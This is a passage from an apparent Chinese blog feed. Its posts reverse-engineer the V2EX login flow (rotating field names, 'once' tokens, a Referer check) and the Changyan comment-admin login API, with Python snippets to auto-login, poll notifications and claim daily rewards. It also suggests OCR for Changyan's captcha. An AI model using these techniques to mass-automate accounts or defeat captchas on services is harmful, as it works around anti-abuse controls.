title="概述"></a>概述</h1><p>最近开始混v2ex，v2ex发主题、回复都要收钱，发帖收钱还跟字数相关，之前不知道这些，发个帖子内容太多，kao，没钱了！</p> <p>虽然主题有人回复会收到钱，但是也没人回复啊，也不知道v2ex大佬们喜欢什么内容！</p> <p>幸好v2ex有个登录领币任务，每天还可以攒点钱，但是有些时候会忘啊，怎么办？…</p> <p>嗯，程序员嘛，偷懒的办法多…这就开始分析接口，自动领币！</p> <a id="more"></a> <p>然后呢，发个主题，总想看看有没有大佬关注和回复，然后就时不时打开浏览器，去刷新一下页面。</p> <p>就跟大部分用windows的人一样，回到桌面不右键+E（刷新）一下，就感觉人生好像少了什么东西（我好像是重症患者，用ubuntu也要找一下刷新桌面）！</p> <p>这种情况是不是病啊？！</p> <p>然后呢，刷新很浪费时间诶，有人回复，看着还算开心嘛，但也没人回复，那不白浪费时间了嘛，还影响期待的小心情！</p> <p>所以呢，还得加上自动消息提醒功能！</p> <p>废话完毕，开始干活！</p> <p>工具：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. chrome/firefox</span><br><span class="line">2. f12，network</span><br><span class="line">3. python：requests、re</span><br></pre></td></tr></table></figure> <h1 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h1><p>开始分析登录接口。打开chrome，f12，进入登录页面。只需要输入名字和密码，没有验证码，真好！</p> <p>访问的链接是：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.v2ex.com/signin</span><br></pre></td></tr></table></figure> <p>然后随便输入什么名字和密码，点击登录，肯定失败，页面有提示。再看网络请求数据：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST https://www.v2ex.com/signin</span><br><span class="line">Host: www.v2ex.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) </span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">//发送数据</span><br><span class="line">6b79e5fdb638c190396648c486c313dca73ad9f6e4e122fafc356e54522eedc4:&quot;111111111111111&quot; //name</span><br><span class="line">bb4419eb55aef4106a853ce9f4642d5d58ac021f4e1fef29a230e2352da74802:&quot;11111111111&quot; //password</span><br><span class="line">once:&quot;95083&quot;</span><br><span class="line">next:&quot;/&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//登录错误</span><br><span class="line">&lt;div class=&quot;box&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;header&quot;&gt;&lt;a href=&quot;/&quot;&gt;V2EX&lt;/a&gt; &lt;span class=&quot;chevron&quot;&gt;&amp;nbsp;›&amp;nbsp;&lt;/span&gt; 登录 &amp;nbsp;&lt;li class=&quot;fa fa-lock&quot;&gt;&lt;/li&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;problem&quot;&gt;请解决以下问题然后再提交：&lt;ul&gt;&lt;li&gt;用户名和密码无法匹配&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure> <p>这个请求关键点:</p> <ol> <li>POST请求，url是<code>https://www.v2ex.com/signin</code></li> <li>发送数据有名字和明文密码，以及两个其他不明字段</li> <li>请求是https，所以明文密码不会暴露。</li> </ol> <p>在仔细看发送的4个数据。<br>名字和密码对应的字段都是一长串字符，猜想这个是变化的，每次刷新登录页面都不一样，多次尝试下确认该猜想！</p> <p>如何获取呢，肯定是在打开登录页面时就会收到服务器返回的这两个字符串的。在登录html内容中一翻，看到如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;box&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;header&quot;&gt;&lt;a href=&quot;/&quot;&gt;V2EX&lt;/a&gt; &lt;span class=&quot;chevron&quot;&gt;&amp;nbsp;›&amp;nbsp;&lt;/span&gt; 登录 &amp;nbsp;&lt;li class=&quot;fa fa-lock&quot;&gt;&lt;/li&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;cell&quot;&gt;</span><br><span class="line">        &lt;form method=&quot;post&quot; action=&quot;/signin&quot;&gt;</span><br><span class="line">        &lt;table cellpadding=&quot;5&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; width=&quot;100%&quot;&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td width=&quot;120&quot; align=&quot;right&quot;&gt;用户名&lt;/td&gt;</span><br><span class="line">                &lt;td width=&quot;auto&quot; align=&quot;left&quot;&gt;&lt;input type=&quot;text&quot; class=&quot;sl&quot; name=&quot;804c76d3f1472cdd8721d16f21de446186f2bae893748542ffda39963ff293f4&quot; value=&quot;111111111111111&quot; autofocus=&quot;autofocus&quot; autocorrect=&quot;off&quot; spellcheck=&quot;false&quot; autocapitalize=&quot;off&quot; placeholder=&quot;用户名或电子邮箱地址&quot; /&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td width=&quot;120&quot; align=&quot;right&quot;&gt;密码&lt;/td&gt;</span><br><span class="line">                &lt;td width=&quot;auto&quot; align=&quot;left&quot;&gt;&lt;input type=&quot;password&quot; class=&quot;sl&quot; name=&quot;359a3968b3b6f37b05fceed766bd8995090a4fd5cdc74ba0a8cd17b44d2bc86e&quot; value=&quot;&quot; autocorrect=&quot;off&quot; spellcheck=&quot;false&quot; autocapitalize=&quot;off&quot; /&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td width=&quot;120&quot; align=&quot;right&quot;&gt;&lt;/td&gt;</span><br><span class="line">                &lt;td width=&quot;auto&quot; align=&quot;left&quot;&gt;&lt;input type=&quot;hidden&quot; value=&quot;79599&quot; name=&quot;once&quot; /&gt;&lt;input type=&quot;submit&quot; class=&quot;super normal button&quot; value=&quot;登录&quot; /&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td width=&quot;120&quot; align=&quot;right&quot;&gt;&lt;/td&gt;</span><br><span class="line">                &lt;td width=&quot;auto&quot; align=&quot;left&quot;&gt;&lt;a href=&quot;/forgot&quot;&gt;我忘记密码了&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">        &lt;/table&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; value=&quot;/&quot; name=&quot;next&quot; /&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure> <p>名字对应字段是<code>&lt;input type=&quot;text&quot; class=&quot;sl&quot; name=&quot;804c76d3f1472cdd8721d16f21de446186f2bae893748542ffda39963ff293f4&quot;</code>，</p> <p>密码对应字段是<code>&lt;input type=&quot;password&quot; class=&quot;sl&quot; name=&quot;359a3968b3b6f37b05fceed766bd8995090a4fd5cdc74ba0a8cd17b44d2bc86e&quot;</code>，</p> <p>可以通过正则获取到字段名。</p> <p>名字正则：<code>r&#39;&lt;input type=&quot;text&quot; class=&quot;sl&quot; name=&quot;([\d\w]*?)&quot;&#39;</code></p> <p>密码正则：<code>r&#39;&lt;input type=&quot;password&quot; class=&quot;sl&quot; name=&quot;([\d\w]*?)&quot;&#39;</code></p> <p>也看到了其他两个数据字段，<code>&lt;input type=&quot;hidden&quot; value=&quot;79599&quot; name=&quot;once&quot; /&gt;</code> 和 <code>&lt;input type=&quot;hidden&quot; value=&quot;/&quot; name=&quot;next&quot; /&gt;</code>。</p> <p><code>once</code>对应的值每次都不一样，<code>next</code>的值应该是固定的<code>/</code>，但是为了保险，都通过正则来获取</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r&apos;&lt;input type=&quot;hidden&quot; value=&quot;([\d\w]+?)&quot; name=&quot;once&quot; /&gt;&apos;</span><br><span class="line">r&apos;&lt;input type=&quot;hidden&quot; value=&quot;(.+?)&quot; name=&quot;next&quot; /&gt;&apos;</span><br></pre></td></tr></table></figure> <p>好了，到此登录请求需要的东西都分析完了，然后就是模拟接口发送请求了。</p> <p>忘了还有一点，返回状态的判断。</p> <p>前面看到登录错误的有提示信息，为了更人性化，把这个信息拿到吧。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//登录错误</span><br><span class="line">&lt;div class=&quot;box&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;header&quot;&gt;&lt;a href=&quot;/&quot;&gt;V2EX&lt;/a&gt; &lt;span class=&quot;chevron&quot;&gt;&amp;nbsp;›&amp;nbsp;&lt;/span&gt; 登录 &amp;nbsp;&lt;li class=&quot;fa fa-lock&quot;&gt;&lt;/li&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;problem&quot;&gt;请解决以下问题然后再提交：&lt;ul&gt;&lt;li&gt;用户名和密码无法匹配&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure> <p>获取错误信息正则是这样：<code>r&#39;&lt;div class=&quot;problem&quot;&gt;.+?&lt;ul&gt;&lt;li&gt;(.*?)&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&#39;</code></p> <p>登录成功判断待会儿再分析。</p> <p>通过py发送模拟登陆请求，代码如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">                self.form_name:name,</span><br><span class="line">                self.form_pass:pwd,</span><br><span class="line">                &apos;once&apos;: self.form_once,</span><br><span class="line">                &apos;next&apos;: self.form_next</span><br><span class="line">                &#125;</span><br><span class="line">r = self.s.post(url, data=payload, headers=headers)</span><br></pre></td></tr></table></figure> <p>保存了返回数据一看，没成功啊，还是未登录的首页。</p> <p>重新再浏览器登录一下，仔细分析了一下。</p> <p>发送了登录请求之后，登录成功之后，页面自动跳转到<code>https://www.v2ex.com</code>，有登录信息了。</p> <p>猜测对请求的头部数据做了某些校验。</p> <p>看看请求的头部数据，如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Host: www.v2ex.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) ...</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 167</span><br><span class="line">Referer: https://www.v2ex.com/signin</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure> <p>一般来说可能会对host，referer等字段检查，加入尝试一下。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;</span><br><span class="line">    #&apos;Host&apos;: &apos;www.v2ex.com&apos;,</span><br><span class="line">    #&apos;origin&apos;:&apos;https://www.v2ex.com&apos;,</span><br><span class="line">    &apos;referer&apos;:&apos;https://www.v2ex.com/signin&apos;,                </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure> <p>成功登录，屏蔽其中一些字段，发现只需要加入referer即可登录。</p> <p>获取登录成功状态，可以看到登录成功后，会有用户账户信息，如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;/member/anhkgg&quot; class=&quot;top&quot;&gt;anhkgg&lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br><span class="line">&lt;a href=&quot;https://workspace.v2ex.com/&quot; target=&quot;_blank&quot; class=&quot;top&quot;&gt;工作空间&lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br><span class="line">&lt;a href=&quot;/notes&quot; class=&quot;top&quot;&gt;记事本&lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;a href=&quot;/t&quot; class=&quot;top&quot;&gt;时间轴&lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;a href=&quot;/settings&quot; class=&quot;top&quot;&gt;设置&lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br><span class="line">&lt;a href=&quot;#;&quot; onclick=&quot;if (confirm(&apos;确定要从 V2EX 登出？&apos;)) &#123; location.href= &apos;/signout?once=54090&apos;; &#125;&quot; class=&quot;top&quot;&gt;登出&lt;/a&gt;&lt;/td&gt;</span><br></pre></td></tr></table></figure> <p>那么只需要搜索是否存在<code>&lt;a href=&quot;/member/anhkgg&quot;</code>即可。正则表达式是：<code>r&#39;&lt;a href=&quot;/member/.+?&quot;&gt;&#39;</code>。找到该内容表示登录成功。</p> <h1 id="退出"><a href="#退出" class="headerlink" title="退出"></a>退出</h1><p>登录成功了，顺便看一下退出的接口。抓包看一下，发现访问了如下链接：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.v2ex.com/signout?once=71351</span><br></pre></td></tr></table></figure> <p>又见到once字段，值又是每次不同的。那么也只有动态获取一下了。在前面登录成功的信息中其实可以看到有退出接口的内容。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onclick=&quot;if (confirm(&apos;确定要从 V2EX 登出？&apos;)) &#123; location.href= &apos;/signout?once=54090&apos;; &#125;&quot; class=&quot;top&quot;&gt;登出&lt;/a&gt;&lt;/td&gt;</span><br></pre></td></tr></table></figure> <p>通过正则获取一下once：<code>r&quot;location.href= &#39;/signout\?once=([\d\w]+?)&#39;&quot;</code>，然后模拟退出。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = &apos;https://www.v2ex.com/signout&apos;</span><br><span class="line">payload = &#123; &apos;once&apos;: self.signout_once&#125;</span><br><span class="line">self.s.get(url, params=payload)</span><br></pre></td></tr></table></figure> <h1 id="新评论"><a href="#新评论" class="headerlink" title="新评论"></a>新评论</h1><p>接着就看看我需要的功能了。</p> <p>首先是获取最新评论条数。找到对应html的内容，如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/a&gt;&lt;/div&gt;&lt;a href=&quot;/notifications&quot; class=&quot;fade&quot;&gt;0 条未读提醒&lt;/a&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure> <p>非常简单，关键字notifications，正则一搜即可拿到。</p> <p><code>r&#39;&lt;a href=&quot;/notifications&quot;.*?&gt;(\d+)(.*?)&lt;/a&gt;&#39;</code></p> <p>不在细说。</p> <p>为了能主动提醒我是否有最新消息，登录成功后，没10分钟刷新一下<code>https://www.v2ex.com</code>，再获取评论条数即可。</p> <p>有新评论就通知我。</p> <h1 id="领取每日奖励"><a href="#领取每日奖励" class="headerlink" title="领取每日奖励"></a>领取每日奖励</h1><p>嗯，钱的事还是挺重要的。</p> <p>首页右侧，每天会出现领取今日奖励的按钮，什么时候出现不知道（过了凌晨12点？），点击后跳转到领取页面，再点击领取按钮就拿到钱了！</p> <p>第一步，拿到领取页面的链接。看下面，是固定的，终于省了一点点事。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;box&quot;&gt;&lt;div class=&quot;inner&quot;&gt;&lt;li class=&quot;fa fa-gift&quot; style=&quot;color: #f90;&quot;&gt;&lt;/li&gt; &amp;nbsp;&lt;a href=&quot;/mission/daily&quot;&gt;领取今日的登录奖励&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure> <p>通过下面的代码跳到领取页面。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url = &apos;https://www.v2ex.com/mission/daily&apos;</span><br><span class="line">r= self.s.get(url)</span><br></pre></td></tr></table></figure> <p>然后看看领取按钮对应的链接，又见once！so，链接不是固定的了。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;cell&quot;&gt;</span><br><span class="line">        &lt;h1&gt;每日登录奖励 20170818&lt;/h1&gt;</span><br><span class="line">        &lt;input type=&quot;button&quot; class=&quot;super normal button&quot; value=&quot;领取 X 铜币&quot; onclick=&quot;location.href = &apos;/mission/daily/redeem?once=48881&apos;;&quot; /&gt;</span><br><span class="line">    &lt;/div&gt;</span><br></pre></td></tr></table></figure> <p>动态获取once对应的值，正则跟退出接口很像：<code>r&quot;&#39;/mission/daily/redeem\?once=([\d\w]+?)&#39;&quot;</code></p> <p>然后模拟请求领取奖励。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = &apos;https://www.v2ex.com/mission/daily/redeem&apos;</span><br><span class="line">payload = &#123; &apos;once&apos;: once&#125;</span><br><span class="line">r = self.s.get(url, params=payload)</span><br></pre></td></tr></table></figure> <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>好了，到这里分析就完成了。分析内容非常详细，然后也贴了些关键代码，所以完整代码就暂时不提供了！</p> <p>v2ex登录通过变化的名字和密码字段，以及once的值，增加了一定的分析成本，但是总的来说，还是没什么难度！挡不了多少人！</p> <p>其他自动回复啊，最新主题啊…等等，各位看官自行脑洞了！</p> <p>pylogin系列还将继续，尽请关注！</p> <p>安利一下公众号：汉客儿</p> <p><img src="/img/wechat_public.png" alt="img"></p> <p>转载请注明出处，博客原文：<a href="https://anhkgg.github.io/pylogin-v2ex-login-analyze/">https://anhkgg.github.io/pylogin-v2ex-login-analyze/</a></p> ]]></content>          <summary type="html">            &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;最近开始混v2ex，v2ex发主题、回复都要收钱，发帖收钱还跟字数相关，之前不知道这些，发个帖子内容太多，kao，没钱了！&lt;/p&gt; &lt;p&gt;虽然主题有人回复会收到钱，但是也没人回复啊，也不知道v2ex大佬们喜欢什么内容！&lt;/p&gt; &lt;p&gt;幸好v2ex有个登录领币任务，每天还可以攒点钱，但是有些时候会忘啊，怎么办？…&lt;/p&gt; &lt;p&gt;嗯，程序员嘛，偷懒的办法多…这就开始分析接口，自动领币！&lt;/p&gt;          </summary>            <category term="crawler" scheme="https://anhkgg.github.io/categories/crawler/"/>                 <category term="crawler" scheme="https://anhkgg.github.io/tags/crawler/"/>            <category term="python" scheme="https://anhkgg.github.io/tags/python/"/>            <category term="js" scheme="https://anhkgg.github.io/tags/js/"/>            <category term="javascript" scheme="https://anhkgg.github.io/tags/javascript/"/>            <category term="v2ex" scheme="https://anhkgg.github.io/tags/v2ex/"/>            <category term="自动领币" scheme="https://anhkgg.github.io/tags/%E8%87%AA%E5%8A%A8%E9%A2%86%E5%B8%81/"/>        </entry>      <entry>     <title>pylogin系列之畅言登录评论接口分析</title>     <link href="https://anhkgg.github.io/pylogin-changyan-login-analyze/"/>     <id>https://anhkgg.github.io/pylogin-changyan-login-analyze/</id>     <published>2017-08-16T16:47:29.000Z</published>     <updated>2017-08-16T17:05:02.929Z</updated>          <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>博客使用了畅言做评论系统（多说、网易云跟帖tmd相继挂了…）。<br>畅言后台可以看出功能非常强大，居然还有广告业务…<br>but，畅言登录之后，即使你选择了记住登录，也会在每次关闭浏览器后需要重新登录，很累好伐！</p> <p>折腾了我几天之后，决定还是决定分析一下登录协议，以及简单后台操作接口，然后写个脚本跑着吧，有新评论就给我”叮”一下，就不用我常常登录去翻了！</p> <a id="more"></a> <h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>开始分析，工具：</p> <ol> <li>chrome/firefox</li> <li>f12，network</li> <li>python</li> </ol> <h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p>chrome打开主页<a href="http://changyan.kuaizhan.com。" target="_blank" rel="noopener">http://changyan.kuaizhan.com。</a></p> <p>F12，调到network的tab页，然后输入登录，找到登录的包。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Request URL:http://changyan.kuaizhan.com/loginAjax?callback=jQuery17107352265034825938_1502508074058&amp;name=xxx&amp;rememberMe=true&amp;password=1111111&amp;vcode=4795&amp;vipIsvId=0&amp;_=1502508184633</span><br><span class="line">Request Method:GET</span><br><span class="line">Status Code:200 OK</span><br><span class="line"></span><br><span class="line">Host:changyan.kuaizhan.com</span><br><span class="line">Referer:http://changyan.kuaizhan.com/</span><br><span class="line">User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36</span><br><span class="line">X-Requested-With:XMLHttpRequest</span><br><span class="line"></span><br><span class="line">callback:jQuery17107352265034825938_1502508074059 //可以没有</span><br><span class="line">name:xxx</span><br><span class="line">rememberMe:true</span><br><span class="line">password:1111111</span><br><span class="line">vcode:1882</span><br><span class="line">vipIsvId:0</span><br><span class="line">_:1502508368658</span><br><span class="line"></span><br><span class="line">//响应</span><br><span class="line">jQuery17101803876020131434_1502867163749(&#123;&quot;data&quot;:&#123;&#125;,&quot;code&quot;:0,&quot;msg&quot;:&quot;success&quot;&#125;); //发送了callback</span><br><span class="line">&#123;&quot;data&quot;:&#123;&#125;,&quot;code&quot;:0,&quot;msg&quot;:&quot;success&quot;&#125;; //没有发送callback</span><br><span class="line"></span><br><span class="line">//其他状态</span><br><span class="line">&#123;&quot;code&quot;:2,&quot;msg&quot;:&quot;验证码错误&quot;&#125;; </span><br><span class="line">&#123;&quot;code&quot;:2,&quot;msg&quot;:&quot;用户名或密码错误!&quot;&#125;</span><br></pre></td></tr></table></figure> <p>很清晰，使用GET，ajax发送数据，主要发送name, password, vcode等数据，经验证callback是可以不需要的，如果发送callback，返回数据会包一层 <code>jQuery17101803876020131434_1502867163749(data)</code>, 如果没有callback，直接返回data。</p> <p>很幸运的是，password没有做任何处理（貌似未强制https，那密码不是明文了…差评！）。没做处理，我倒简单了，不用做多余分析了，登录接口基本就这样。</p> <p>然后是返回数据，是json数据，成功code是0，错误code是2，然后是具体错误msg。不细说。</p> <h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><p>每次登录都需要验证码，挺烦的。为了自动登录，还得拿到验证码。</p> <p>获取验证码接口如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Request URL:http://changyan.kuaizhan.com/verifyCode?_1502508320545</span><br><span class="line">Request Method:GET</span><br><span class="line"></span><br><span class="line">Content-Type:image/jpeg; charset=UTF-8</span><br></pre></td></tr></table></figure> <p>返回一张jpg图片，验证码处理比较简单，应该可以用tesseract-ocr识别，没有验证。</p> <p><img src="/img/changyan1.png" alt="img"></p> <h2 id="评论"><a href="#评论" class="headerlink" title="评论"></a>评论</h2><p>登录成功后，进入后台。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Request URL:http://changyan.kuaizhan.com/overview</span><br><span class="line">Request Method:GET</span><br><span class="line">Status Code:200 OK</span><br></pre></td></tr></table></figure> <p><img src="/img/changyan2.png" alt="img"></p> <p>返回整个后台页面，通过页面元素找到评论位置，html代码如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;li class=&quot;right-sub-li &quot;&gt;&lt;a href=&quot;/audit/comments/TOAUDIT/1&quot; style=&quot;text-indent:25px;&quot;&gt;</span><br><span class="line">    &lt;span class=&quot;audit-number&quot;&gt;2&lt;/span&gt;</span><br><span class="line">    &lt;span style=&quot;text-indent:0px;&quot;&gt;本站评论审核&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;</span><br></pre></td></tr></table></figure> <p>通过<code>r&#39;&lt;span class=&quot;audit-number&quot;&gt;(\d+?)&lt;/span&gt;&#39;</code>正则可以获取到待审核评论数，也就是新增评论，要的就是这个。</p> <h2 id="评论统计接口"><a href="#评论统计接口" class="headerlink" title="评论统计接口"></a>评论统计接口</h2><p>获取评论信息接口，使用的是ajax访问（我这用不上，顺便分析下）。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Request URL:http://changyan.kuaizhan.com/stat-data/comment</span><br><span class="line">Request Method:POST</span><br><span class="line">Status Code:200 OK</span><br><span class="line"></span><br><span class="line">Host:changyan.kuaizhan.com</span><br><span class="line">Origin:http://changyan.kuaizhan.com</span><br><span class="line">Referer:http://changyan.kuaizhan.com/overview</span><br><span class="line">User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36</span><br><span class="line">X-Requested-With:XMLHttpRequest</span><br><span class="line"></span><br><span class="line">start:20170805</span><br><span class="line">end:20170811</span><br><span class="line">categoryId:0</span><br><span class="line"></span><br><span class="line">//响应</span><br><span class="line">&#123;&quot;sdk_user_data&quot;:&#123;&#125;,&quot;user_data&quot;:&#123;&quot;20170810&quot;:1&#125;,&quot;sdk_cmt_data&quot;:&#123;&#125;,&quot;wap_cmt_data&quot;:&#123;&#125;,&quot;total_data&quot;:&#123;&quot;20170810&quot;:1,&quot;20170811&quot;:0&#125;,&quot;recommender_data&quot;:&#123;&#125;,&quot;wap_user_data&quot;:&#123;&#125;,&quot;cmt_data&quot;:&#123;&quot;20170810&quot;:1&#125;,&quot;wap_reply_data&quot;:&#123;&#125;,&quot;flood_data&quot;:&#123;&quot;20170810&quot;:0,&quot;20170811&quot;:0&#125;,&quot;sdk_reply_data&quot;:&#123;&#125;,&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure> <p>接口使用ajax POST，发送参数可以选择时间区间。</p> <p>返回数据为json，具体意义如下：</p> <figure class="highlight plain"><table><tr><td 